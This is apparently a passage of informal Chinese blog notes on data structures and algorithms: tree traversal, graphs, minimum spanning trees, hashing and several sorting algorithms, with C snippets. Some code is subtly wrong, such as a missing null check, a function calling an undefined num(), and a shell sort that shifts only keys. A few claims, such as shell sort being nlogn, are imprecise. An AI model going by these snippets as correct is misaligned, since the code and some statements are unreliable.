<p>还有离线的tarjan和在线的RMQ, QAQ, 已经都不会写了, 我现在咸鱼一条,可能只会, 那个, 俩点往上一跳一跳的操作….</p>
<p>先不在这里花时间了.</p>
<h3 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h3><p>其实, 有个问题是, 我们经常说的<code>先序</code>, <code>后序</code>, <code>中序</code>  和 <code>DFS</code>, <code>BFS</code>之间的关系…emmmmmm, 我可能是个傻子<br>网络上基本上没有人放在一起考虑过<br>但仔细想了一下…<br>其实<code>先..中..后</code>这个应该是<code>dfs</code>, 因为其实<code>dfs</code>和<code>递归</code>对应, 我现在认为<code>前中后</code>是给dfs节点打时间戳的不同方法…就比如先序的话就认为是…第一次访问这个节点就打…后续的话…认为dfs过程中….该节点的孩子都遍历完了, 再打…<br>而且由于..这个先序的特点…好像看起来先序就和我们通常意义上说的dfs是完全一样的了<br>再仔细想一想…dfs其实是没有规定访问子节点的顺序的, 但可以认为规定先访问左子树还是右子树..所以,其实这个dfs还比<code>先中后</code>要多样…可以认为我们二叉树<code>先中后</code>只是dfs一些…说不出来</p>
<p>恩, 对…前中后就是打个时间戳,你甚至可以每次遍历打两个时间戳, 一个先序, 一个后序…那么某个节点两次时间戳之间的内容就是他的子树..其实拿出代码来一看…很清楚的东西..为什么我这才意识到</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span>node <span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">// visit(p); 位置1</span>
    <span class="token function">dfs</span><span class="token punctuation">(</span>p <span class="token operator">-></span> lson<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// visit(p); 位置2</span>
    <span class="token function">dfs</span><span class="token punctuation">(</span>p <span class="token operator">-></span> rson<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment" spellcheck="true">// visit(p); 位置3</span>
<span class="token punctuation">}</span>
<span class="token keyword">void</span> <span class="token function">visit</span><span class="token punctuation">(</span>node <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"node %d has been visited\n"</span><span class="token punctuation">,</span> p <span class="token operator">-></span> index<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这里的dfs里, visit分别在1, 2, 3位置就是前中后序<br>所以, 以后就可以说是, 中序的dfs…这样子说话</p>
<p>而bfs这种队列实现的搜索方法…好像和这些没有关系</p>
<p>以上仅对二叉树而言….因为多叉树的话还能bfs, dfs, 但其实不存在中序遍历了</p>
<p>就是…<br><code>dfs</code>, <code>栈</code>, <code>递归</code> 这都是联系在一起的<br><code>bfs</code>, <code>队列</code>是联系在一起的…, 好像bfs也叫层次遍历<br>所以写dfs, 原理上是用栈…但实际上只要写函数调用(递归)就可以…而不像<code>bfs</code>要我们自己维护一个队列</p>
<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>后序的话用在…父节点状态要在孩子节点信息之上推出的场景…其实很常用, 比如求解, 树的高度</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span>node <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> lf <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>p <span class="token operator">-></span> lson<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> rf <span class="token operator">=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>p <span class="token operator">-></span> rson<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token function">max</span><span class="token punctuation">(</span>lf<span class="token punctuation">,</span> rf<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我很久不写代码了, 也不知道写的对不对</p>
<p>要统计一个累加的量的时候, 感觉好像其实, 前中后就没那么重要了</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span>node <span class="token operator">*</span> p<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        sum<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token function">dfs</span><span class="token punctuation">(</span>p <span class="token operator">-></span> lson<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// sum++放在这里也可以</span>
        <span class="token function">dfs</span><span class="token punctuation">(</span>p <span class="token operator">-></span> rson<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// sum++放在这里也可以</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment" spellcheck="true">// 如果用c++的话, 这里的sum可以用应用传进来.写成`void dfs(node *p, int &amp;sum)`</span>
<span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span>node <span class="token operator">*</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">&amp;</span>sum<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
    <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        sum<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token function">dfs</span><span class="token punctuation">(</span>p <span class="token operator">-></span> lson<span class="token punctuation">,</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// sum++放在这里也可以</span>
        <span class="token function">dfs</span><span class="token punctuation">(</span>p <span class="token operator">-></span> rson<span class="token punctuation">,</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment" spellcheck="true">// sum++放在这里也可以</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里的<code>sum</code>是一个全局变量<br>还有一种和那个求树的高度的写法极其类似的写法见下边….几乎就是一毛一样…明显更加简洁. perfect</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span>node <span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">num</span><span class="token punctuation">(</span>p <span class="token operator">-></span> lson<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">num</span><span class="token punctuation">(</span>p <span class="token operator">-></span> rson<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>已知<code>先-中</code>或者<code>后-中</code>, 就可以确定一颗二叉树的结构….</p>
<h3 id="线索二叉树"><a href="#线索二叉树" class="headerlink" title="线索二叉树"></a>线索二叉树</h3><p>这里先跳过了</p>
<h3 id="树和森林的存储方式"><a href="#树和森林的存储方式" class="headerlink" title="树和森林的存储方式"></a>树和森林的存储方式</h3><p>这里</p>
<h3 id="各种树"><a href="#各种树" class="headerlink" title="各种树"></a>各种树</h3><p>哈夫曼树<br>线段树<br>字典树<br>主席树<br>划分树<br>…<br>…<br>陷入沉思<br>我想回宿舍了….突然厌烦</p>
<h2 id="图"><a href="#图" class="headerlink" title="图"></a>图</h2><p>表示方法: <code>G = &lt;V, E&gt;</code><br>V: 定点集合<br>G: 边集合…又有有方向和没有方向两种<br>通常有方向的记为<code>&lt;V1, V2&gt;</code>, 没有方向的边记为<code>(V1, V2)</code></p>
<p>定点的度: 有向图还分为入度和出度</p>
<blockquote>
<p>这里有个东西…你看…就是…怎么说…那个.这个.我..就是<br>在树中, 我们说的度其实指的是某一个节点的出度…(如果把树看做图的话…), 而没有算他的入度, 对不对</p>
</blockquote>
<h3 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h3><p>简单路径: 中间经过节点不重复的路径(不算首尾)<br>回路    : 首尾相同的路径<br>简单回路: 简单路径 + 回路</p>
<p>连通图: 无向图中任意两点都存在路径的话, 则称为连通图, 否则就是非联通图</p>
<ol>
<li>任何连通图的连通分量只有一个, 就是它本身</li>
<li>非连通的无向图有多个连通分量, 这些分量好像都叫..极大连通子图</li>
</ol>
<p>强连通图: 在有向图G中, 若任意两点都可达(可达意味着正反都存在路径), 那么就称为是强连通</p>
<ol>
<li>任何强连通图的连通分量只有一个, 就是它本身</li>
<li>非强连通的有向图有多个强连通分量, 这些分量好像都叫..极大连通子图</li>
</ol>
<p>完全图: 无向的话…是任意两点间都有一条边…有向的话…是相当于任意两定点都一来一回对吧, 所以<br>n个节点的无向完全图..共有<code>n * (n - 1) / 2</code>条边<br>n个节点的有向完全图..共有<code>n * (n - 1)</code>条边</p>
<p>树: 连通无回路的无向图, n个节点, (n - 1)条边, 树是有最少边数的连通图</p>
<p>你看…这个树是<code>无向 无环</code>, 而DAG是<code>有向 无环</code>, 是不是有些相似的定义</p>
<h3 id="图的存储方式"><a href="#图的存储方式" class="headerlink" title="图的存储方式"></a>图的存储方式</h3><ol>
<li><p>邻接矩阵<br>无向图的邻接矩阵是三角对称结构<br>对于某一顶点, 分别, 横着数, 竖着数, 就能.能!算出入度和出度了<br>邻接关系也好确定</p>
</li>
<li><p>邻接表<br>比起邻接矩阵, 其实邻接表,在判断是否邻接的时候…比较麻烦…要遍历才能得到..无向图还好, 有向的话…确实有点…<br>矩阵相当于是空间换时间了, 方便而且…如果过于稀疏的话, 我们才用邻接表, 就是这样<br>有一个折中的办法是:<br>用一个邻接表和一个逆邻接的表…这样子的话, 判断入度出度的话就方便一些…</p>
</li>
</ol>
<h3 id="图的遍历算法"><a href="#图的遍历算法" class="headerlink" title="图的遍历算法"></a>图的遍历算法</h3><ol>
<li>深度优先DFS<br>DFS用在非连通图或者某些有向图里, 能实现一个效果…就是, 当遍历完所有节点之后(可能调用了多次DFS), 这个时候就能得到各个(强)连通分量, 代码大概如下<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span>graph G<span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> false<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 初始化</span>
 <span class="token punctuation">}</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>visited<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> 
         <span class="token function">dfs</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
应用(先mark, 没有具体写)<br>求无向图的连通分量: 这个可以DFS一遍, 也可以并查集, 还可以BFS一遍…<br>感觉应该是并查集快一些…但难写一些?</li>
</ol>
<p>求有向图的强连通分量(SCC):</p>
<ol>
<li>Tarjan</li>
<li>Kosaraju</li>
<li><p>Gabow<br>这三种应该都是DFS, 或者多次DFS</p>
</li>
<li><p>广度优先BFS<br>广度优先的话可以说是层次遍历<br>应用: 算出最短路径….</p>
</li>
</ol>
<h3 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h3><p>权值最小的边一定在最小生成树里<br>两种算法可解决</p>
<ol>
<li><p>prim<br>基本思想:<br>在<code>一端已选，另一端未选</code>的候选边中选出一条最小的边…<br>有点绕口, 但思路是很简单的<br>如何高效的维护这个侯选边的集合是我们的关键</p>
</li>
<li><p>Kruskal<br>基本思想:<br>选一条最小的边使得其和已经选择的边不构成回路<br>关键在于如何判断构成回路</p>
</li>
</ol>
<h3 id="拓扑排序-有向图"><a href="#拓扑排序-有向图" class="headerlink" title="拓扑排序(有向图)"></a>拓扑排序(有向图)</h3><p>依然是常用的两种算法, 哎, 省赛的时候就在这里搁了…自己脑残把两种算法无缝拼接了一下…然后发现运行不了了…然后和一等说白白了…23333, 回想起来, 都是泪</p>
<ol>
<li><p>Kahn<br>这个名字..其实听得不多….但一说..这个算法的关键,在于维护..那个入度为0的点的集合..每次要做的操作就是把入度为0的点去掉…就可以了<br>这个算法还能判断是不是有环…即DAG的判断<br>但我隐约记得…Kahn要实现按照字典序来输出拓扑排序结果好像有点问题<br>因为..某一节点入度的改变是由于与她相连的的节点的删去而引起的…所以可以只考察, 刚删去的节点的后继节点是不是该加入这个候选集合, 综述, 可以使用<code>栈</code>来实现这个拓扑排序</p>
</li>
<li><p>dfs</p>
</li>
</ol>
<h3 id="关键路径"><a href="#关键路径" class="headerlink" title="关键路径"></a>关键路径</h3><h3 id="最短路"><a href="#最短路" class="headerlink" title="最短路"></a>最短路</h3><ol>
<li>单源Dijkstar</li>
<li>多源Floyd<br>等下写</li>
</ol>
<h2 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h2><ol>
<li>简单顺序查找: 一个一个找</li>
<li>二分查找    : 需要是有序的…也就是说要选排序, 复杂度带<code>logn</code><br>记得自己然后手写一个二分….虽然STL里好像有…STL啥都有…STL选手</li>
<li>分块        : 块间有序, 块内无序, 分块的大小一般取<code>√n</code>, 这个复杂度带<code>√n</code><br>分块就是块内暴力…的方法..看着很暴力…其实还挺好用的..不太动脑筋而复杂度常常能达到要求</li>
</ol>
<h3 id="树-1"><a href="#树-1" class="headerlink" title="树"></a>树</h3><ol>
<li><p>BST<br>就是左子树中所有节点值小于父节点值, 而右子树大于父节点<br>所以,按照中序遍历就能得到一个非降序列…<br>BST有个问题就是刻意构造的数据可能导致BST退化成链表<br>针对这个问题…大家想出了平衡树这个东西</p>
</li>
<li><p>平衡树<br>平衡树其实有很多很多种….<br>只要满足下面条件的BST都是平衡树:</p>
<ol>
<li>左右子树的高度差绝对值不大于1</li>
<li>左右子树都是平衡树<br>所以…这个平衡树这一类树是采用各种方法来防止BST退化的方法的树<br>具体地说, 代表之一就是AVL…<br>其实朝鲜树, 替罪羊, 还有SBT这些…都算是平衡树,可能不太平衡…就是说可能不满足这里定义说的高度差不超过1, 但是用自己的方法来保证了树的相对平衡</li>
</ol>
</li>
<li><p>AVL</p>
</li>
<li><p>B-Tree</p>
</li>
</ol>
<h3 id="Hash表"><a href="#Hash表" class="headerlink" title="Hash表"></a>Hash表</h3><p>大概涉及到几个问题</p>
<ol>
<li>计算ASL</li>
<li>构造散列函数</li>
<li>解决冲突</li>
</ol>
<p>构造散列函数的方法</p>
<ol>
<li><p>直接定址法</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token function">Hash</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=</span> k<span class="token punctuation">,</span> 或者 <span class="token function">Hash</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token operator">=</span> a<span class="token operator">*</span>k<span class="token operator">+</span>b
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li><p>除留取余<br>Hash(k) = k % p, 一般这个p是个质数(prime)</p>
</li>
<li><p>平方取中法<br>这是什么玄学…把数字算个平方…然后取出来中间两位算hash</p>
</li>
<li><p>康拓展开<br>这个是以前做过的一个八数码问题里遇到的, 用于把全排列进行hash的一种没有冲突的方法</p>
</li>
</ol>
<p>冲突是指出现了:<br>k1 ~= k2, 但Hash(k1) = Hash(k2) 的情况<br>处理冲突的方法, 感觉可能会考</p>
<ol>
<li><p>开放地址法</p>
</li>
<li><p>拉链法<br>把hash值相同的丢到一个vector里…这不就是一个邻接表吗….</p>
</li>
<li><p>再散列法</p>
</li>
</ol>
<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>其实…看了下整个块…排序算是不太熟悉的…因为自己遇到问题, 复杂度不要求的话写个最好写的冒泡, 要求的话写个快排..其他的这些奇奇怪怪的排序都很少手写</p>
<p>几个概念：<br>    稳定排序  : 排序过程中， 关键字相同的元素相对次序不变<br>    不稳定排序: 排序过程中， 不能保证关键字相同的元素相对次序不变<br>    内/外部排序: 外部的话。。。部分数据在内存， 部分在外存</p>
<h3 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h3><p>思想: 把整个待排序的表看成两部分. 左边是有序的, 右边是无序的…整个过程是把无序区的元素插入到有序区</p>
<ol>
<li><p>简单插入排序</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>element_type A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">int</span> temp <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">></span> temp<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         A<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
         j<span class="token operator">--</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     A<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>就是一轮下来， 边比较, 边挪位置<code>A[j + 1] = A[j]</code>, 的那满足条件的时候…把本次考察的值放到找好的这个空位置上…<br>有一个技巧叫设置<del>烧饼</del> 哨兵, 我们把A[0]作为烧饼的话, 就是A[0]一定会满足条件… 那我们上面代码中的边界状态判断<code>j &gt;= 1</code>, 就可以去掉了</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>element_type A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     A<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
     <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">></span> A<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         A<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
         j<span class="token operator">--</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     A<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> A<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>很明显，这个直接插入排序是稳定的</p>
</li>
<li><p>希尔排序<br>分组的简单插入排序<br>这个排的我有点迷…不稳定排序， 但复杂度变成了<code>nlogn</code><br>每次相隔d的元素化成一组进行排序….这个d是变步长的..开始的时候 d = n/2, 每次都会有<code>d /= 2</code>…最后一次的d是1…就是所有元素都排<br>代码上来讲,,,,和普通插基本一样的感觉</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span>elementtype A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 d <span class="token operator">=</span> n <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
 <span class="token keyword">while</span><span class="token punctuation">(</span>d <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> d <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">int</span> x <span class="token operator">=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
         j <span class="token operator">=</span> i <span class="token operator">-</span> d<span class="token punctuation">;</span>
         <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">></span> x<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>j <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
             A<span class="token punctuation">[</span>j <span class="token operator">+</span> d<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">=</span> A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">;</span>
             j <span class="token operator">=</span> j <span class="token operator">-</span> d<span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
         A<span class="token punctuation">[</span>j <span class="token operator">+</span> d<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     d <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h3 id="交换类排序"><a href="#交换类排序" class="headerlink" title="交换类排序"></a>交换类排序</h3><p>思想: 两两比较交换, 一边比啊一边换</p>
<blockquote>
<p>比较插入排序的话, 插入是每次考察一个元素, 和已经有序的区域比较, 直到找到合适的位置放进去</p>
<ol>
<li>冒泡排序<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">bubble</span><span class="token punctuation">(</span>elementtype A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">&lt;</span> A<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span>
             <span class="token function">swap</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> A<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
冒泡是稳定的..</li>
</ol>
</blockquote>
<ol>
<li>快排<br>快排不稳定…然后写个好看的快排</li>
</ol>
<h3 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h3><p>在每一趟排序中, 从待选子表中选出关键字最大或者最小的元素放到最终位置上</p>
<ol>
<li><p>直接选择排序</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">select</span><span class="token punctuation">(</span>elementtype A<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
 <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     min <span class="token operator">=</span> i<span class="token punctuation">;</span>
     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">&lt;</span> A<span class="token punctuation">[</span>min<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span>
             min <span class="token operator">=</span> j<span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span>min <span class="token operator">!=</span> i<span class="token punctuation">)</span>
         <span class="token function">swap</span><span class="token punctuation">(</span>A<span class="token punctuation">[</span>min<span class="token punctuation">]</span><span class="token punctuation">,</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>选择排序居然也是不稳定排序, emmmmm</p>
</li>
<li><p>树形选择排序<br>看到树,首先想到复杂度肯定是比较小….<br>md， 这个操作还挺好看的…言语不是很好描述</p>
</li>
